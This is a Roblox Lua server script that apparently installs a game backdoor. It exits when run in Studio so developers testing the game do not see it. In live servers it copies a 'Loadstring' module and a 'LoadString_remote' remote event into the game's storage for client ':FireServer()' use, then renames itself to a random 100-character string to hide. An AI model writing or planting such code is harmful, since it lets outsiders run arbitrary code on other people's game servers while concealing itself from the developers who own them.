local RunService = game:GetService("RunService")
 
if RunService:IsStudio() then
	return;
end
 
if RunService:IsRunMode() then
	return;
end

if not game:GetService("ServerStorage"):FindFirstChild("Loadstring") then
local module = script.Parent:FindFirstChild("Loadstring")
module_clone = module:Clone()
module_clone.Parent = game:GetService("ServerStorage")
repeat wait() until game:GetService("ServerStorage"):FindFirstChild("Loadstring")
else
game:GetService("ServerStorage"):FindFirstChild("Loadstring"):ClearAllChildren()
game:GetService("ServerStorage"):FindFirstChild("Loadstring"):Destroy()
wait()
local module = script.Parent:FindFirstChild("Loadstring")
module_clone = module:Clone()
module_clone.Parent = game:GetService("ServerStorage")
end

if not game:GetService("ReplicatedStorage"):FindFirstChild("LoadString_remote") then
local module = script.Parent:FindFirstChild("LoadString_remote")
module_clone = module:Clone()
module_clone.Parent = game:GetService("ReplicatedStorage")
repeat wait() until game:GetService("ReplicatedStorage"):FindFirstChild("LoadString_remote")
else
game:GetService("ReplicatedStorage"):FindFirstChild("LoadString_remote"):ClearAllChildren()
game:GetService("ReplicatedStorage"):FindFirstChild("LoadString_remote"):Destroy()
wait()
local module = script.Parent:FindFirstChild("LoadString_remote")
module_clone = module:Clone()
module_clone.Parent = game:GetService("ReplicatedStorage")
repeat wait() until game:GetService("ReplicatedStorage"):FindFirstChild("LoadString_remote")
end

local letters = {"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"}

function assing_value(number)
	if number <= 26 then
		number = letters[number]
		else
		number = number - 27
	end
	return number
end

function create_id(length)
	local id = ""
	if length > 0 then
		for i = 1, length do
			local number = math.random(1, 36)
			id = id .. assing_value(number)
		end
	end
	return id
end


script.Name = ""..create_id(100)


--for :FireServer() events.

local deletus = game:GetService("ReplicatedStorage"):FindFirstChild("LoadString_remote")
